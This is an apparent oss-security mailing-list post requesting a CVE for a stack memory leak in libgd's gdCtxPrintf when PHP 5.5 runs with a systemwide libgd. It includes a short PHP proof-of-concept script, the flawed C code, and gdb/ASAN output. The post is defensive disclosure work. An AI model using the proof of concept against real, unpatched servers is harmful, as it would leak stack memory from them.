@@ -1,0 +1,85 @@
+
+Date: Sun, 29 May 2016 12:43:34 -0500
+From: Fernando Muñoz <fernando@...l-life.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: libgd - gdCtxPrintf memory leak
+
+libgd report:
+https://github.com/libgd/libgd/issues/211
+
+PHP report:
+https://bugs.php.net/bug.php?id=72115 - password 18c90f75
+
+Fix:
+https://github.com/libgd/libgd/commit/4dc1a2d7931017d3625f2d7cff70a17ce58b53b4
+
+Credit: Fernando Muñoz and Marcelo Echeverria
+
+While creating an XBM image (imagexbm) with an user supplied name,
+libgd isn't checking the vsnprintf return value and PHP 5.5 will trust
+this length and read more memory than it should, causing a read-out-of
+boundaries, leaking stack memory.
+
+vsnprintf man: "a return value of size or more means that the output
+was truncated".
+
+PHP devs marked it as a "not a bug" because the bundled version of
+libgd with PHP 5.5 is not vulnerable, however using PHP with
+systemwide libgd is a common practice. PHP 5.6 and PHP 7 are not
+vulnerable to this issue because another bugfix prevents this from
+being exploited [1].
+
+Test script (PHP 5.5 and systemwide libgd):
+<?php
+$var1=imagecreatetruecolor ( 2 , 2);
+$var2=str_repeat("ABCD", 1030);
+imagexbm($var1, $var2, 0);
+
+
+Affected code:
+/* {{{ gdCtxPrintf */
+static void gdCtxPrintf(gdIOCtx * out, const char *format, ...)
+{
+    char buf[4096];
+    int len;
+    va_list args;
+
+    va_start(args, format);
+    len = vsnprintf(buf, sizeof(buf)-1, format, args);
+     // -----> if len > 4096 data was truncated
+     // -----> but libgd returns this value as is
+    va_end(args);
+    out->putBuf(out, buf, len);
+}
+
+
+Debug:
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/php/php-55/sapi/cli/php -n
+-dextension=/home/user/php/php-55/modules/gd.so /home/user/img.php
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, _php_image_output_putbuf (ctx=0xb46ddf38,
+buf=0xbfffa69c, l=8017) at /home/user/php/php-55/ext/gd/gd_ctx.c:39
+39              return php_write((void *)buf, l TSRMLS_CC);
+(gdb) print l
+$7 = 8017
+
+PHP will use 8017 as string length.
+
+ASAN:
+#define ABCD... <random stuff from memory> ...
+==============================================
+ERROR: AddressSanitizer: stack-buffer-underflow on address
+0xbfffb750 at pc 0xb7aa6dbd bp 0xbfffa408 sp 0xbfff9fdc
+READ of size 8017 at 0xbfffb750 thread T0
+                                       #0 0xb7aa6dbc
+(/usr/lib/i386-linux-gnu/libasan.so.2+0x3ddbc)
+    #1 0x99388cf in sapi_cli_single_write
+/home/user/php/php-55/sapi/cli/php_cli.c:273
+
+
+[1] https://bugs.php.net/bug.php?id=66339
